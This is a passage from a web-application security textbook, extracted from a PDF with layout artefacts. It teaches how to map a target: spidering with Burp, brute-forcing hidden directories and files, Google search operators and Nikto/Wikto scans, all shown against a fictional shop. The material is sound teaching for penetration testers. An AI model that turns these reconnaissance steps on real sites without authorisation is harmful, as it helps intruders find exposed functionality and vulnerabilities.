actual practicalities of attacking web applications.
In any attack, your fi rst task is to map the target application‚Äôs content and 
functionality to establish how it functions, how it attempts to defend itself, and 
what technologies it uses. The next chapter examines this mapping process 
in detail and shows how you can use it to obtain a deep understanding of an 
application‚Äôs attack surface. This knowledge will prove vital when it comes to 
fi nding and exploiting security fl aws within your target.
c03.indd 70 c03.indd 70 8/19/2011 12:03:46 PM 8/19/2011 12:03:46 PM
Stuttard c03.indd V3 - 07/22/2011 Page 71
 Chapter 3 n Web Application Technologies 71
Questions
Answers can be found at http://mdsec.net/wahh.
 1. What is the OPTIONS method used for?
 2. What are the If-Modified-Since and If-None-Match headers used for? 
Why might you be interested in these when attacking an application?
 3. What is the signifi cance of the secure fl ag when a server sets a cookie?
 4. What is the difference between the common status codes 301 and 302?
 5. How does a browser interoperate with a web proxy when SSL is being 
used?
c03.indd 71 c03.indd 71 8/19/2011 12:03:46 PM 8/19/2011 12:03:46 PM
Stuttard c03.indd V3 - 07/22/2011 Page 72
c03.indd 72 c03.indd 72 8/19/2011 12:03:46 PM 8/19/2011 12:03:46 PM
Stuttard c04.indd V3 - 07/22/2011 Page 73
73
 C H A P T E R 
4
Mapping the Application
The fi rst step in the process of attacking an application is gathering and examining some key information about it to gain a better understanding of what you 
are up against.
The mapping exercise begins by enumerating the application‚Äôs content and 
functionality in order to understand what the application does and how it 
behaves. Much of this functionality is easy to identify, but some of it may be 
hidden, requiring a degree of guesswork and luck to discover.
After a catalog of the application‚Äôs functionality has been assembled, the 
principal task is to closely examine every aspect of its behavior, its core security mechanisms, and the technologies being employed (on both the client and 
server). This will enable you to identify the key attack surface that the application 
exposes and hence the most interesting areas where you should target subsequent probing to fi nd exploitable vulnerabilities. Often the analysis exercise can 
uncover vulnerabilities by itself, as discussed later in the chapter.
As applications get ever larger and more functional, effective mapping is a 
valuable skill. A seasoned expert can quickly triage whole areas of functionality, 
looking for classes of vulnerabilities as opposed to instances, while investing 
signifi cant time in testing other specifi c areas, aiming to uncover a high-risk issue.
This chapter describes the practical steps you need to follow during application 
mapping, various techniques and tricks you can use to maximize its effectiveness, and some tools that can assist you in the process.
c04.indd 73 c04.indd 73 8/19/2011 12:04:40 PM 8/19/2011 12:04:40 PM
Stuttard c04.indd V3 - 07/22/2011 Page 74
74 Chapter 4 n Mapping the Application
Enumerating Content and Functionality
In a typical application, the majority of the content and functionality can be 
identifi ed via manual browsing. The basic approach is to walk through the 
application starting from the main initial page, following every link, and navigating through all multistage functions (such as user registration or password 
resetting). If the application contains a ‚Äúsite map,‚Äù this can provide a useful 
starting point for enumerating content.
However, to perform a rigorous inspection of the enumerated content, and 
to obtain a comprehensive record of everything identifi ed, you must employ 
more advanced techniques than simple browsing.
Web Spidering
Various tools can perform automated spidering of websites. These tools work 
by requesting a web page, parsing it for links to other content, requesting these 
links, and continuing recursively until no new content is discovered.
Building on this basic function, web application spiders attempt to achieve 
a higher level of coverage by also parsing HTML forms and submitting these 
back to the application using various preset or random values. This can enable 
them to walk through multistage functionality and to follow forms-based navigation (such as where drop-down lists are used as content menus). Some tools 
also parse client-side JavaScript to extract URLs pointing to further content. 
Numerous free tools are available that do a decent job of enumerating application content and functionality, including Burp Suite, WebScarab, Zed Attack 
Proxy, and CAT (see Chapter 20 for more details).
TIP Many web servers contain a fi le named robots.txt in the web root that 
contains a list of URLs that the site does not want web spiders to visit or search 
engines to index. Sometimes, this fi le contains references to sensitive functionality, which you are certainly interested in spidering. Some spidering tools 
designed for attacking web applications check for the robots.txt fi le and use 
all URLs within it as seeds in the spidering process. In this case, the robots.txt
fi le may be counterproductive to the security of the web application.
This chapter uses a fi ctional application, Extreme Internet Shopping (EIS), to 
provide examples of common application mapping actions. Figure 4-1 shows 
Burp Spider running against EIS. Without logging on, it is possible to map out the 
/shop directory and two news articles in the /media directory. Also note that 
the robots.txt fi le shown in the fi gure references the directories /mdsecportal
and /site-old. These are not linked from anywhere in the application and would 
not be indexed by a web spider that only followed links from published content.
TIP Applications that employ REST-style URLs use portions of the URL fi le 
path to uniquely identify data and other resources used within the application 
c04.indd 74 c04.indd 74 8/19/2011 12:04:41 PM 8/19/2011 12:04:41 PM
Stuttard c04.indd V3 - 07/22/2011 Page 75
 Chapter 4 n Mapping the Application 75
(see Chapter 3 for more details). The traditional web spider‚Äôs URL-based view 
of the application is useful in these situations. In the EIS application, the 
/shop and /pub paths employ REST-style URLs, and spidering these areas easily provides unique links to the items available within these paths.
Figure 4-1: Mapping part of an application using Burp Spider
Although it can often be effective, this kind of fully automated approach to 
content enumeration has some signifi cant limitations:
n Unusual navigation mechanisms (such as menus dynamically created 
and handled using complicated JavaScript code) often are not handled 
properly by these tools, so they may miss whole areas of an application.
n Links buried within compiled client-side objects such as Flash or Java 
applets may not be picked up by a spider.
n Multistage functionality often implements fi ne-grained input validation 
checks, which do not accept the values that may be submitted by an automated tool. For example, a user registration form may contain fi elds for 
name, e-mail address, telephone number, and zip code. An automated 
c04.indd 75 c04.indd 75 8/19/2011 12:04:41 PM 8/19/2011 12:04:41 PM
Stuttard c04.indd V3 - 07/22/2011 Page 76
76 Chapter 4 n Mapping the Application
application spider typically submits a single test string in each editable 
form fi eld, and the application returns an error message saying that one 
or more of the items submitted were invalid. Because the spider is not 
intelligent enough to understand and act on this message, it does not 
proceed past the registration form and therefore does not discover any 
more content or functions accessible beyond it.
n Automated spiders typically use URLs as identifi ers of unique content. 
To avoid continuing spidering indefi nitely, they recognize when linked 
content has already been requested and do not request it again. However, 
many applications use forms-based navigation in which the same URL 
may return very different content and functions. For example, a banking application may implement every user action via a POST request to 
/account.jsp and use parameters to communicate the action being performed. If a spider refuses to make multiple requests to this URL, it will 
miss most of the application‚Äôs content. Some application spiders attempt 
to handle this situation. For example, Burp Spider can be confi gured to 
individuate form submissions based on parameter names and values. 
However, there may still be situations where a fully automated approach 
is not completely effective. We discuss approaches to mapping this kind 
of functionality later in this chapter.
n Conversely to the previous point, some applications place volatile data 
within URLs that is not actually used to identify resources or functions (for 
example, parameters containing timers or random number seeds). Each 
page of the application may contain what appears to be a new set of URLs 
that the spider must request, causing it to continue running indefi nitely.
n Where an application uses authentication, an effective application spider 
must be able to handle this to access the functionality that the authentication protects. The spiders mentioned previously can achieve this by 
manually confi guring the spider either with a token for an authenticated 
session or with credentials to submit to the login function. However, even 
when this is done, it is common to fi nd that the spider‚Äôs operation breaks 
the authenticated session for various reasons:
n By following all URLs, at some point the spider will request the logout 
function, causing its session to break.
n If the spider submits invalid input to a sensitive function, the application may defensively terminate the session.
n If the application uses per-page tokens, the spider almost certainly will 
fail to handle these properly by requesting pages out of their expected 
sequence, probably causing the entire session to be terminated.
c04.indd 76 c04.indd 76 8/19/2011 12:04:41 PM 8/19/2011 12:04:41 PM
Stuttard c04.indd V3 - 07/22/2011 Page 77
 Chapter 4 n Mapping the Application 77
WARNING In some applications, running even a simple web spider that 
parses and requests links can be extremely dangerous. For example, an application may contain administrative functionality that deletes users, shuts down a 
database, restarts the server, and the like. If an application-aware spider is used, 
great damage can be done if the spider discovers and uses sensitive functionality. The authors have encountered an application that included some Content 
Management System (CMS) functionality for editing the content of the main 
application. This functionality could be discovered via the site map and was not 
protected by any access control. If an automated spider were run against this 
site, it would fi nd the edit function and begin sending arbitrary data, resulting in 
the main website‚Äôs being defaced in real time while the spider was running.
User-Directed Spidering
This is a more sophisticated and controlled technique that is usually preferable to automated spidering. Here, the user walks through the application in 
the normal way using a standard browser, attempting to navigate through all 
the application‚Äôs functionality. As he does so, the resulting traffi c is passed 
through a tool combining an intercepting proxy and spider, which monitors 
all requests and responses. The tool builds a map of the application, incorporating all the URLs visited by the browser. It also parses all the application‚Äôs 
responses in the same way as a normal application-aware spider and updates 
the site map with the content and functionality it discovers. The spiders 
within Burp Suite and WebScarab can be used in this way (see Chapter 20 
for more information).
Compared with the basic spidering approach, this technique offers numerous benefi ts:
n Where the application uses unusual or complex mechanisms for navigation, 
the user can follow these using a browser in the normal way. Any functions 
and content accessed by the user are processed by the proxy/spider tool.
n The user controls all data submitted to the application and can ensure 
that data validation requirements are met.
n The user can log in to the application in the usual way and ensure that the 
authenticated session remains active throughout the mapping process. If 
any action performed results in session termination, the user can log in 
again and continue browsing.
n Any dangerous functionality, such as deleteUser.jsp, is fully enumerated and incorporated into the proxy‚Äôs site map, because links to it will be 
parsed out of the application‚Äôs responses. But the user can use discretion 
in deciding which functions to actually request or carry out.
c04.indd 77 c04.indd 77 8/19/2011 12:04:41 PM 8/19/2011 12:04:41 PM
Stuttard c04.indd V3 - 07/22/2011 Page 78
78 Chapter 4 n Mapping the Application
In the Extreme Internet Shopping site, previously it was impossible for the 
spider to index any content within /home, because this content is authenticated. 
Requests to /home result in this response:
HTTP/1.1 302 Moved Temporarily
Date: Mon, 24 Jan 2011 16:13:12 GMT
Server: Apache
Location: /auth/Login?ReturnURL=/home/
With user-directed spidering, the user can simply log in to the application 
using her browser, and the proxy/spider tool picks up the resulting session and 
identifi es all the additional content now available to the user. Figure 4-2 shows 
the EIS site map when the user has successfully authenticated to the protected 
areas of the application.
Figure 4-2: Burp‚Äôs site map after user-guided spidering has been performed
This reveals some additional resources within the home menu system. The 
fi gure shows a reference to a private profi le that is accessed through a JavaScript 
function launched with the onClick event handler:
<a href=‚Äù#‚Äù onclick=‚Äùui_nav(‚Äòprofile‚Äô)‚Äù>private profile</a>
c04.indd 78 c04.indd 78 8/19/2011 12:04:41 PM 8/19/2011 12:04:41 PM
Stuttard c04.indd V3 - 07/22/2011 Page 79
 Chapter 4 n Mapping the Application 79
A conventional web spider that simply follows links within HTML is likely to 
miss this type of link. Even the most advanced automated application crawlers 
lag way behind the numerous navigational mechanisms employed by today‚Äôs 
applications and browser extensions. With user-directed spidering, however, 
the user simply needs to follow the visible on-screen link using her browser, 
and the proxy/spider tool adds the resulting content to the site map.
Conversely, note that the spider has successfully identifi ed the link to /core/
sitestats contained in an HTML comment, even though this link is not shown 
on-screen to the user.
TIP In addition to the proxy/spider tools just described, another range 
of tools that are often useful during application mapping are the various 
browser extensions that can perform HTTP and HTML analysis from within the 
browser interface. For example, the IEWatch tool shown in Figure 4-3, which 
runs within Microsoft Internet Explorer, monitors all details of requests and 
responses, including headers, request parameters, and cookies. It analyzes 
every application page to display links, scripts, forms, and thick-client components. Of course, all this information can be viewed in your intercepting proxy, 
but having a second record of useful mapping data can only help you better 
understand the application and enumerate all its functionality. See Chapter 20 
for more information about tools of this kind.
Figure 4-3: IEWatch performing HTTP and HTML analysis from within the browser
c04.indd 79 c04.indd 79 8/19/2011 12:04:42 PM 8/19/2011 12:04:42 PM
Stuttard c04.indd V3 - 07/22/2011 Page 80
80 Chapter 4 n Mapping the Application
HACK STEPS
 1. Configure your browser to use either Burp or WebScarab as a local proxy 
(see Chapter 20 for specific details about how to do this if you‚Äôre unsure).
 2. Browse the entire application normally, attempting to visit every link/URL 
you discover, submitting every form, and proceeding through all multistep functions to completion. Try browsing with JavaScript enabled and 
disabled, and with cookies enabled and disabled. Many applications can 
handle various browser configurations, and you may reach different content and code paths within the application.
 3. Review the site map generated by the proxy/spider tool, and identify 
any application content or functions that you did not browse manually. 
Establish how the spider enumerated each item. For example, in Burp 
Spider, check the Linked From details. Using your browser, access the item 
manually so that the response from the server is parsed by the proxy/spider tool to identify any further content. Continue this step recursively until 
no further content or functionality is identified.
 4. Optionally, tell the tool to actively spider the site using all of the already 
enumerated content as a starting point. To do this, first identify any URLs 
that are dangerous or likely to break the application session, and configure the spider to exclude these from its scope. Run the spider and review 
the results for any additional content it discovers.
The site map generated by the proxy/spider tool contains a wealth of information about the target application, which will be useful later in identifying 
the various attack surfaces exposed by the application.
Discovering Hidden Content
It is common for applications to contain content and functionality that is not 
directly linked to or reachable from the main visible content. A common example 
is functionality that has been implemented for testing or debugging purposes 
and has never been removed.
Another example arises when the application presents different functionality 
to different categories of users (for example, anonymous users, authenticated 
regular users, and administrators). Users at one privilege level who perform 
exhaustive spidering of the application may miss functionality that is visible to 
users at other levels. An attacker who discovers the functionality may be able 
to exploit it to elevate her privileges within the application.
There are countless other cases in which interesting content and functionality 
may exist that the mapping techniques previously described would not identify:
n Backup copies of live fi les. In the case of dynamic pages, their fi le extension 
may have changed to one that is not mapped as executable, enabling you 
c04.indd 80 c04.indd 80 8/19/2011 12:04:42 PM 8/19/2011 12:04:42 PM
Stuttard c04.indd V3 - 07/22/2011 Page 81
 Chapter 4 n Mapping the Application 81
to review the page source for vulnerabilities that can then be exploited 
on the live page.
n Backup archives that contain a full snapshot of fi les within (or indeed 
outside) the web root, possibly enabling you to easily identify all content 
and functionality within the application.
n New functionality that has been deployed to the server for testing but not 
yet linked from the main application.
n Default application functionality in an off-the-shelf application that has 
been superfi cially hidden from the user but is still present on the server.
n Old versions of fi les that have not been removed from the server. In the 
case of dynamic pages, these may contain vulnerabilities that have been 
fi xed in the current version but that can still be exploited in the old version.
n Confi guration and include fi les containing sensitive data such as database 
credentials.
n Source fi les from which the live application‚Äôs functionality has been 
compiled.
n Comments in source code that in extreme cases may contain information 
such as usernames and passwords but that more likely provide information 
about the state of the application. Key phrases such as ‚Äútest this function‚Äù 
or something similar are strong indicators of where to start hunting for 
vulnerabilities.
n Log fi les that may contain sensitive information such as valid usernames, 
session tokens, URLs visited, and actions performed.
Effective discovery of hidden content requires a combination of automated and 
manual techniques and often relies on a degree of luck.
Brute-Force Techniques
Chapter 14 describes how automated techniques can be leveraged to speed up 
just about any attack against an application. In the present context of information gathering, automation can be used to make huge numbers of requests to the 
web server, attempting to guess the names or identifi ers of hidden functionality.
For example, suppose that your user-directed spidering has identifi ed the 
following application content:
http://eis/auth/Login
http://eis/auth/ForgotPassword
http://eis/home/
http://eis/pub/media/100/view
http://eis/images/eis.gif
http://eis/include/eis.css
c04.indd 81 c04.indd 81 8/19/2011 12:04:42 PM 8/19/2011 12:04:42 PM
Stuttard c04.indd V3 - 07/22/2011 Page 82
82 Chapter 4 n Mapping the Application
The fi rst step in an automated effort to identify hidden content might involve 
the following requests, to locate additional directories:
http://eis/About/
http://eis/abstract/
http://eis/academics/
http://eis/accessibility/
http://eis/accounts/
http://eis/action/
...
Burp Intruder can be used to iterate through a list of common directory 
names and capture details of the server‚Äôs responses, which can be reviewed to 
identify valid directories. Figure 4-4 shows Burp Intruder being confi gured to 
probe for common directories residing at the web root.
Figure 4-4: Burp Intruder being configured to probe for common directories
When the attack has been executed, clicking column headers such as ‚Äústatus‚Äù 
and ‚Äúlength‚Äù sorts the results accordingly, enabling you to quickly identify a 
list of potential further resources, as shown in Figure 4-5.
Having brute-forced for directories and subdirectories, you may then want 
to fi nd additional pages in the application. Of particular interest is the /auth
directory containing the Login resource identifi ed during the spidering process, which is likely to be a good starting point for an unauthenticated attacker. 
Again, you can request a series of fi les within this directory:
c04.indd 82 c04.indd 82 8/19/2011 12:04:42 PM 8/19/2011 12:04:42 PM
Stuttard c04.indd V3 - 07/22/2011 Page 83
 Chapter 4 n Mapping the Application 83
http://eis/auth/About/
http://eis/auth/Aboutus/
http://eis/auth/AddUser/
http://eis/auth/Admin/
http://eis/auth/Administration/
http://eis/auth/Admins/
...
Figure 4-5: Burp Intruder showing the results of a directory brute-force attack
Figure 4-6 shows the results of this attack, which has identifi ed several resources 
within the /auth directory:
Login
Logout
Register
Profile
Note that the request for Profile returns the HTTP status code 302. This 
indicates that accessing this link without authentication redirects the user to 
the login page. Of further interest is that although the Login page was discovered during spidering, the Register page was not. It could be that this extra 
functionality is operational, and an attacker could register a user account on 
the site.
c04.indd 83 c04.indd 83 8/19/2011 12:04:42 PM 8/19/2011 12:04:42 PM
Stuttard c04.indd V3 - 07/22/2011 Page 84
84 Chapter 4 n Mapping the Application
Figure 4-6: Burp Intruder showing the results of a file brute-force attack
NOTE Do not assume that the application will respond with 200 OK if a 
requested resource exists and 404 Not Found if it does not. Many applications handle requests for nonexistent resources in a customized way, often 
returning a bespoke error message and a 200 response code. Furthermore, 
some requests for existent resources may receive a non-200 response. The following is a rough guide to the likely meaning of the response codes that you 
may encounter during a brute-force exercise looking for hidden content:
n 302 Found ‚Äî If the redirect is to a login page, the resource may be 
accessible only by authenticated users. If the redirect is to an error message, this may indicate a different reason. If it is to another location, the 
redirect may be part of the application‚Äôs intended logic, and this should 
be investigated further.
n 400 Bad Request ‚Äî The application may use a custom naming scheme 
for directories and fi les within URLs, which a particular request has not 
complied with. More likely, however, is that the wordlist you are using 
contains some whitespace characters or other invalid syntax.
n 401 Unauthorized or 403 Forbidden ‚Äî This usually indicates that 
the requested resource exists but may not be accessed by any user, 
c04.indd 84 c04.indd 84 8/19/2011 12:04:43 PM 8/19/2011 12:04:43 PM
Stuttard c04.indd V3 - 07/22/2011 Page 85
 Chapter 4 n Mapping the Application 85
regardless of authentication status or privilege level. It often occurs when 
directories are requested, and you may infer that the directory exists.
n 500 Internal Server Error ‚Äî During content discovery, this usually 
indicates that the application expects certain parameters to be submitted 
when requesting the resource.
The various possible responses that may indicate the presence of interesting 
content mean that is diffi cult to write a fully automated script to output a listing of valid resources. The best approach is to capture as much information as 
possible about the application‚Äôs responses during the brute-force exercise and 
manually review it.
HACK STEPS
 1. Make some manual requests for known valid and invalid resources, and 
identify how the server handles the latter.
 2. Use the site map generated through user-directed spidering as a basis for 
automated discovery of hidden content.
 3. Make automated requests for common filenames and directories within 
each directory or path known to exist within the application. Use Burp 
Intruder or a custom script, together with wordlists of common files and 
directories, to quickly generate large numbers of requests. If you have identified a particular way in which the application handles requests for invalid 
resources (such as a customized ‚Äúfile not found‚Äù page), configure Intruder 
or your script to highlight these results so that they can be ignored.
 4. Capture the responses received from the server, and manually review 
them to identify valid resources.
 5. Perform the exercise recursively as new content is discovered.
Inference from Published Content
Most applications employ some kind of naming scheme for their content and 
functionality. By inferring from the resources already identifi ed within the 
application, it is possible to fi ne-tune your automated enumeration exercise to 
increase the likelihood of discovering further hidden content.
In the EIS application, note that all resources in /auth start with a capital letter. 
This is why the wordlist used in the fi le brute forcing in the previous section 
was deliberately capitalized. Furthermore, since we have already identifi ed a 
page called ForgotPassword in the /auth directory, we can search for similarly 
named items, such as the following:
http://eis/auth/ResetPassword
c04.indd 85 c04.indd 85 8/19/2011 12:04:43 PM 8/19/2011 12:04:43 PM
Stuttard c04.indd V3 - 07/22/2011 Page 86
86 Chapter 4 n Mapping the Application
Additionally, the site map created during user-directed spidering identifi ed 
these resources:
http://eis/pub/media/100
http://eis/pub/media/117
http://eis/pub/user/11
Other numeric values in a similar range are likely to identify further resources 
and information.
TIP Burp Intruder is highly customizable and can be used to target any portion of an HTTP request. Figure 4-7 shows Burp Intruder being used to perform a brute-force attack on the fi rst half of a fi lename to make the requests:
http://eis/auth/AddPassword
http://eis/auth/ForgotPassword
http://eis/auth/GetPassword
http://eis/auth/ResetPassword
http://eis/auth/RetrievePassword
http://eis/auth/UpdatePassword
...
Figure 4-7: Burp Intruder being used to perform a customized brute-force attack on 
part of a filename
c04.indd 86 c04.indd 86 8/19/2011 12:04:43 PM 8/19/2011 12:04:43 PM
Stuttard c04.indd V3 - 07/22/2011 Page 87
 Chapter 4 n Mapping the Application 87
HACK STEPS
 1. Review the results of your user-directed browsing and basic brute-force 
exercises. Compile lists of the names of all enumerated subdirectories, file 
stems, and file extensions.
 2. Review these lists to identify any naming schemes in use. For example, if 
there are pages called AddDocument.jsp and ViewDocument.jsp, there 
may also be pages called EditDocument.jsp and RemoveDocument.jsp.
You can often get a feel for developers‚Äô naming habits just by reading a 
few examples. For example, depending on their personal style, developers may be verbose (AddANewUser.asp), succinct (AddUser.asp), use 
abbreviations (AddUsr.asp), or even be more cryptic (AddU.asp). Getting 
a feel for the naming styles in use may help you guess the precise names 
of content you have not already identified.
 3. Sometimes, the naming scheme used for different content employs 
identifiers such as numbers and dates, which can make inferring hidden 
content easy. This is most commonly encountered in the names of static 
resources, rather than dynamic scripts. For example, if a company‚Äôs website links to AnnualReport2009.pdf and AnnualReport2010.pdf,
it should be a short step to identifying what the next report will be called. 
Somewhat incredibly, there have been notorious cases of companies 
placing files containing financial reports on their web servers before they 
were publicly announced, only to have wily journalists discover them 
based on the naming scheme used in earlier years.
 4. Review all client-side code such as HTML and JavaScript to identify any 
clues about hidden server-side content. These may include HTML comments related to protected or unlinked functions, HTML forms with disabled SUBMIT elements, and the like. Often, comments are automatically 
generated by the software that has been used to generate web content, 
or by the platform on which the application is running. References to 
items such as server-side include files are of particular interest. These 
files may actually be publicly downloadable and may contain highly sensitive information such as database connection strings and passwords. In 
other cases, developers‚Äô comments may contain all kinds of useful tidbits, 
such as database names, references to back-end components, SQL query 
strings, and so on. Thick-client components such as Java applets and 
ActiveX controls may also contain sensitive data that you can extract. See 
Chapter 15 for more ways in which the application may disclose information about itself.
Continued
c04.indd 87 c04.indd 87 8/19/2011 12:04:43 PM 8/19/2011 12:04:43 PM
Stuttard c04.indd V3 - 07/22/2011 Page 88
88 Chapter 4 n Mapping the Application
 5. Add to the lists of enumerated items any further potential names conjectured on the basis of the items that you have discovered. Also add to 
the file extension list common extensions such as txt, bak, src, inc,
and old, which may uncover the source to backup versions of live pages. 
Also add extensions associated with the development languages in use, 
such as .java and .cs, which may uncover source files that have been 
compiled into live pages. (See the tips later in this chapter for identifying 
technologies in use.)
 6. Search for temporary files that may have been created inadvertently by 
developer tools and file editors. Examples include the .DS_Store file, 
which contains a directory index under OS X, file.php~1, which is a 
temporary file created when file.php is edited, and the .tmp file extension that is used by numerous software tools.
 7. Perform further automated exercises, combining the lists of directories, 
file stems, and file extensions to request large numbers of potential 
resources. For example, in a given directory, request each file stem combined with each file extension. Or request each directory name as a subdirectory of every known directory.
 8. Where a consistent naming scheme has been identified, consider performing a more focused brute-force exercise. For example, if AddDocument
.jsp and ViewDocument.jsp are known to exist, you may create 
a list of actions (edit, delete, create) and make requests of the form 
XxxDocument.jsp. Alternatively, create a list of item types (user, account, 
file) and make requests of the form AddXxx.jsp.
 9. Perform each exercise recursively, using new enumerated content and 
patterns as the basis for further user-directed spidering and further automated content discovery. You are limited only by your imagination, time 
available, and the importance you attach to discovering hidden content 
within the application you are targeting.
NOTE You can use the Content Discovery feature of Burp Suite Pro to automate most of the tasks described so far. After you have manually mapped an 
application‚Äôs visible content using your browser, you can select one or more 
branches of Burp‚Äôs site map and initiate a content discovery session on those 
branches.
Burp uses the following techniques when attempting to discover new 
content:
n Brute force using built-in lists of common fi le and directory names
n Dynamic generation of wordlists based on resource names observed 
within the target application
n Extrapolation of resource names containing numbers and dates
HACK STEPS (continued)
c04.indd 88 c04.indd 88 8/19/2011 12:04:43 PM 8/19/2011 12:04:43 PM
Stuttard c04.indd V3 - 07/22/2011 Page 89
 Chapter 4 n Mapping the Application 89
n Testing for alternative fi le extensions on identifi ed resources
n Spidering from discovered content
n Automatic fi ngerprinting of valid and invalid responses to reduce false 
positives
All exercises are carried out recursively, with new discovery tasks being 
scheduled as new application content is discovered. Figure 4-8 shows a content discovery session in progress against the EIS application.
Figure 4-8: A content discovery session in progress against the EIS application
TIP The DirBuster project from OWASP is also a useful resource when performing automated content discovery tasks. It includes large lists of directory 
names that have been found in the wild, ordered by frequency of occurrence.
Use of Public Information
The application may contain content and functionality that are not presently linked 
from the main content but that have been linked in the past. In this situation, 
it is likely that various historical repositories will still contain references to the 
hidden content. Two main types of publicly available resources are useful here:
n Search engines such as Google, Yahoo, and MSN. These maintain a fi negrained index of all content that their powerful spiders have discovered, 
and also cached copies of much of this content, which persists even after 
the original content has been removed.
n Web archives such as the WayBack Machine, located at www.archive.org/.
These archives maintain a historical record of a large number of websites. 
In many cases they allow users to browse a fully replicated snapshot of a 
given site as it existed at various dates going back several years.
c04.indd 89 c04.indd 89 8/19/2011 12:04:43 PM 8/19/2011 12:04:43 PM
Stuttard c04.indd V3 - 07/22/2011 Page 90
90 Chapter 4 n Mapping the Application
In addition to content that has been linked in the past, these resources are 
also likely to contain references to content that is linked from third-party sites, 
but not from within the target application itself. For example, some applications 
contain restricted functionality for use by their business partners. Those partners may disclose the existence of the functionality in ways that the application 
itself does not.
HACK STEPS
 1. Use several different search engines and web archives (listed previously) 
to discover what content they indexed or stored for the application you 
are attacking.
 2. When querying a search engine, you can use various advanced techniques 
to maximize the effectiveness of your research. The following suggestions 
apply to Google. You can find the corresponding queries on other engines 
by selecting their Advanced Search option.
n site:www.wahh-target.com returns every resource within the target 
site that Google has a reference to.
n site:www.wahh-target.com login returns all the pages containing the 
expression login. In a large and complex application, this technique can 
be used to quickly home in on interesting resources, such as site maps, 
password reset functions, and administrative menus.
n link:www.wahh-target.com returns all the pages on other websites 
and applications that contain a link to the target. This may include links 
to old content, or functionality that is intended for use only by third parties, such as partner links.
n related:www.wahh-target.com returns pages that are ‚Äúsimilar‚Äù to the 
target and therefore includes a lot of irrelevant material. However, it may 
also discuss the target on other sites, which may be of interest.
 3. Perform each search not only in the default Web section of Google, but 
also in Groups and News, which may contain different results.
 4. Browse to the last page of search results for a given query, and select 
Repeat the Search with the Omitted Results Included. By default, Google 
attempts to filter out redundant results by removing pages that it believes 
are sufficiently similar to others included in the results. Overriding this 
behavior may uncover subtly different pages that are of interest to you 
when attacking the application.
 5. View the cached version of interesting pages, including any content that is 
no longer present in the actual application. In some cases, search engine 
caches contain resources that cannot be directly accessed in the application without authentication or payment.
c04.indd 90 c04.indd 90 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 91
 Chapter 4 n Mapping the Application 91
 6. Perform the same queries on other domain names belonging to the same 
organization, which may contain useful information about the application 
you are targeting.
If your research identifi es old content and functionality that is no longer 
linked to within the main application, it may still be present and usable. The 
old functionality may contain vulnerabilities that do not exist elsewhere 
within the application.
Even where old content has been removed from the live application, the 
content obtained from a search engine cache or web archive may contain 
references to or clues about other functionality that is still present within the 
live application and that can be used to attack it.
Another public source of useful information about the target application is 
any posts that developers and others have made to Internet forums. There are 
numerous such forums in which software designers and programmers ask 
and answer technical questions. Often, items posted to these forums contain 
information about an application that is of direct benefi t to an attacker, including 
the technologies in use, the functionality implemented, problems encountered 
during development, known security bugs, confi guration and log fi les submitted to assist in troubleshooting, and even extracts of source code.
HACK STEPS
 1. Compile a list containing every name and e-mail address you can discover 
relating to the target application and its development. This should include 
any known developers, names found within HTML source code, names found 
in the contact information section of the main company website, and any 
names disclosed within the application itself, such as administrative staff.
 2. Using the search techniques described previously, search for each identified name to find any questions and answers they have posted to Internet 
forums. Review any information found for clues about functionality or vulnerabilities within the target application.
Leveraging the Web Server
Vulnerabilities may exist at the web server layer that enable you to discover 
content and functionality that are not linked within the web application itself. 
For example, bugs within web server software can allow an attacker to list the 
contents of directories or obtain the raw source for dynamic server-executable 
pages. See Chapter 18 for some examples of these vulnerabilities and ways in 
which you can identify them. If such a bug exists, you may be able to exploit it to 
directly obtain a listing of all pages and other resources within the application.
c04.indd 91 c04.indd 91 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 92
92 Chapter 4 n Mapping the Application
Many application servers ship with default content that may help you attack 
them. For example, sample and diagnostic scripts may contain known vulnerabilities or functionality that may be leveraged for a malicious purpose. 
Furthermore, many web applications incorporate common third-party components for standard functionality, such as shopping carts, discussion forums, 
or content management system (CMS) functions. These are often installed to a 
fi xed location relative to the web root or to the application‚Äôs starting directory.
Automated tools lend themselves naturally to this type of task, and many 
issue requests from a large database of known default web server content, thirdparty application components, and common directory names. While these tools 
do not rigorously test for any hidden custom functionality, they can often be 
useful in discovering other resources that are not linked within the application 
and that may be of interest in formulating an attack.
Wikto is one of the many free tools that performs these types of scans, additionally containing a confi gurable brute-force list for content. As shown in 
Figure 4-9, when used against the Extreme Internet Shopping site, it identifi es 
some directories using its internal wordlist. Because it has a large database of 
common web application software and scripts, it has also identifi ed the following directory, which an attacker would not discover through automated or 
user-driven spidering:
http://eis/phpmyadmin/
Figure 4-9: Wikto being used to discover content and some known vulnerabilities
Additionally, although the /gb directory had already been identifi ed via 
spidering, Wikto has identifi ed the specifi c URL:
/gb/index.php?login=true
Wikto checks for this URL because it is used in the gbook PHP application, 
which contains a publicly known vulnerability.
c04.indd 92 c04.indd 92 8/19/2011 12:04:44 PM 8/19/2011 12:04:44 PM
Stuttard c04.indd V3 - 07/22/2011 Page 93
 Chapter 4 n Mapping the Application 93
WARNING Like many commercial web scanners, tools such as Nikto and 
Wikto contain vast lists of default fi les and directories and consequently appear 
to be industrious at performing a huge number of checks. However, a large 
number of these checks are redundant, and false positives are common. Worse 
still, false negatives may occur regularly if a server is confi gured to hide a banner, if a script or collection of scripts is moved to a different directory, or if 
HTTP status codes are handled in a custom manner. For this reason it is often 
better to use a tool such as Burp Intruder, which allows you to interpret the raw 
response information and does not attempt to extract positive and negative 
results on your behalf.
HACK STEPS
Several useful options are available when you run Nikto:
 1. If you believe that the server is using a nonstandard location for interesting content that Nikto checks for (such as /cgi/cgi-bin instead of 
/cgi-bin), you can specify this alternative location using the option ‚Äìroot 
/cgi/. For the specific case of CGI directories, these can also be specified 
using the option ‚ÄìCgidirs.
 2. If the site uses a custom ‚Äúfile not found‚Äù page that does not return the 
HTTP 404 status code, you can specify a particular string that identifies 
this page by using the -404 option.
 3. Be aware that Nikto does not perform any intelligent verification of 
potential issues and therefore is prone to report false positives. Always 
check any results Nikto returns manually.
Note that with tools like Nikto, you can specify a target application using its 
domain name or IP address. If a tool accesses a page using its IP address, the 
tool treats links on that page that use its domain name as belonging to a different domain, so the links are not followed. This is reasonable, because some 
applications are virtually hosted, with multiple domain names sharing the 
same IP address. Ensure that you confi gure your tools with this fact in mind.
Application Pages Versus Functional Paths
The enumeration techniques described so far have been implicitly driven by one 
particular picture of how web application content may be conceptualized and 
